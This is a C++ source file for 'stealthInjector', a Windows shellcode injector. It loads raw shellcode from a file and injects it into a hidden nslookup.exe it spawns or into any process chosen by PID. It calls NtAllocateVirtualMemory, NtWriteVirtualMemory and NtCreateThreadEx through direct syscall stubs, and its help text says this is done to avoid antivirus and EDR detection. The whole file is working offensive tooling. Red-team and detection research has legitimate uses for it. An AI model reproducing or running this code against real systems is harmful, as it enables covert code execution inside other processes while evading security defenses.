#include <iostream>
#include <fstream>
#include "getSyscall.h"

#define UNICODE 1
#pragma comment(lib, "ntdll")

/* put your shellcode here, I'll eventually add a command line option to read in shellcode from file */

using myNtAllocateVirutalMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);

using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, LPVOID BaseAddress, char* Buffer, ULONG RegionSize, PULONG numBytesWritten);

using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T ZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

int injectShellcode(BOOL spawnProc, int PID, BOOL unsafe, char* shellcode, size_t shellsize) {

	LPVOID allocation_start;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPCSTR cmd;
	myNtAllocateVirutalMemory NtAllocateVirtualMemory;
	myNtWriteVirtualMemory NtWriteVirtualMemory;
	myNtCreateThreadEx NtCreateThreadEx;
	SIZE_T RegionSize = (SIZE_T)shellsize;
	HANDLE hThread;
	HANDLE procHandle;

	// If spawnProc set, then spawn our own process to inject
	if (spawnProc) {
		/* The below code starts the process nslookup.exe so we can inject above shellcode into it. */

		printf("[*] Spawning process nslookup.exe\n\n");

		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));
		si.cb = sizeof(si);
		//cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");
		cmd = "C:\\Windows\\System32\\nslookup.exe";

		if (!CreateProcessA(
			cmd,							// Executable
			NULL,							// Command line
			NULL,							// Process handle not inheritable
			NULL,							// Thread handle not inheritable
			FALSE,							// Set handle inheritance to FALSE
			CREATE_NO_WINDOW,	            // Do Not Open a Window
			NULL,							// Use parent's environment block
			NULL,							// Use parent's starting directory 
			(LPSTARTUPINFOA) &si,			                // Pointer to STARTUPINFO structure
			&pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
		)) {
			DWORD errval = GetLastError();
			std::cout << "FAILED" << errval << std::endl;
		}
		WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize.

		printf("[+] Spawned process nslookup.exe\n\n");
	}

	// If unsafe not set, then use direct syscalls 
	if (!unsafe) {
		/* The below code defines the syscall functions and retrieves syscall stubs */

		char syscallStub_NtAlloc[SYSCALL_STUB_SIZE] = {};
		char syscallStub_NtWrite[SYSCALL_STUB_SIZE] = {};
		char syscallStub_NtCreate[SYSCALL_STUB_SIZE] = {};
		DWORD oldProtection = 0;

		// define NtAllocateVirtualMemory
		NtAllocateVirtualMemory = (myNtAllocateVirutalMemory)(LPVOID)syscallStub_NtAlloc;
		VirtualProtect(syscallStub_NtAlloc, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

		// define NtWriteVirtualMemory
		NtWriteVirtualMemory = (myNtWriteVirtualMemory)(LPVOID)syscallStub_NtWrite;
		VirtualProtect(syscallStub_NtWrite, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

		// define NtCreateThreadEx
		NtCreateThreadEx = (myNtCreateThreadEx)(LPVOID)syscallStub_NtCreate;
		VirtualProtect(syscallStub_NtCreate, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

		// get syscall stubs
		GetSyscallStub("NtAllocateVirtualMemory", syscallStub_NtAlloc);
		GetSyscallStub("NtWriteVirtualMemory", syscallStub_NtWrite);
		GetSyscallStub("NtCreateThreadEx", syscallStub_NtCreate);

		allocation_start = nullptr;

		if (spawnProc) {
			/* this code will inject into remote process that we did create (nslookup.exe from above) using direct syscalls */

			printf("[*] Injecting into spawned process using direct syscalls\n\n");

			NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, shellsize, 0);
			NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pi.hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
			
			printf("[+] Injected into spawned process\n\n");

			return 0;
		}
		else {
			/* this code will inject into a remote process that we didnt start given PID using direct syscalls */

			printf("[*] Injecting into remote process using direct syscalls\n\n");
			
			procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
			NtAllocateVirtualMemory(procHandle, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			NtWriteVirtualMemory(procHandle, allocation_start, shellcode, shellsize, 0);
			NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, procHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
			
			printf("[+] Injected into remote process\n\n");

			return 0;
		}
	}
	else {
		if (spawnProc) {
			/* this code will inject into remote process that we did create (nslookup.exe from above) using high level API functions (just for testing, will get detected by AV)*/

			printf("[*] Injecting into spawned process using API calls\n\n");

			allocation_start = VirtualAllocEx(pi.hProcess, NULL, shellsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			WriteProcessMemory(pi.hProcess, allocation_start, shellcode, shellsize, NULL);
			CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);

			printf("[+] Injected into spawned process\n\n");

			return 0;
		}
		else {
			/* this code will inject into a remote process that we didnt start given PID using high level API calls */

			printf("[*] Injecting into remote process using API calls\n\n");

			procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
			allocation_start = VirtualAllocEx(procHandle, NULL, shellsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			WriteProcessMemory(procHandle, allocation_start, shellcode, shellsize, NULL);
			CreateRemoteThread(procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);

			printf("[+] Injected into remote process\n\n");

			return 0;
		}
	}
	
	return 0;
}

int main(int argc, char* argv[]) {
	using namespace std::literals;

	printf("\nstealthInjector by @JohnWoodman15\n\n");
	
	bool spawnProc = false;
	bool unsafe = false;
	int PID = 0;
	int shell_index = -1;
	char shellcode[4096];

	if (argc < 2) {
		printf("[-] Error: No flags given. Use -h to view help page\n");
		return 0;
	}

	for (int i = 0; i < argc; i++) {
		if (strcmp(argv[i], "-h") == 0) {
			printf("Usage: stealthInjector.exe -shellcode <file> [-spawnProc | -pid <num>] [-unsafe]\n\n");
			printf("-spawnProc: spawn nslookup.exe and inject into that\n");
			printf("-pid <num>: inject into remote process given PID\n");
			printf("-unsafe: inject shellcode using high-level API calls (likely to get caught by AV/EDR)\n");
			printf("-shellcode <file>: raw shellcode to inject\n");
			return 0;
		}
		if (strcmp(argv[i], "-spawnProc") == 0) {
			spawnProc = true;
		}
		if (strcmp(argv[i], "-pid") == 0) {
			PID = atoi(argv[i + 1]);
		}
		if (strcmp(argv[i], "-unsafe") == 0) {
			unsafe = true;
		}
		if (strcmp(argv[i], "-shellcode") == 0) {
			shell_index = i + 1;
		}
	}

	if (shell_index == -1) {
		printf("[-] Error: Missing -shellcode flag\n\n");
		return 0;
	}
	if (PID != 0 && spawnProc) {
		printf("[-] Error: Cannot use flag -spawnProc with flag -pid\n\n");
		return 0;
	}

	std::ifstream in(argv[shell_index], std::ios::binary);
	if (!in.is_open()) {
		printf("Error Opening Shellcode File\n\n");
		return 0;
	}

	memset(shellcode, '\0', 4096);
	in.read(shellcode, 4096);
	in.close();

	injectShellcode(spawnProc, PID, unsafe, shellcode, strlen(shellcode));

	return 0;
}
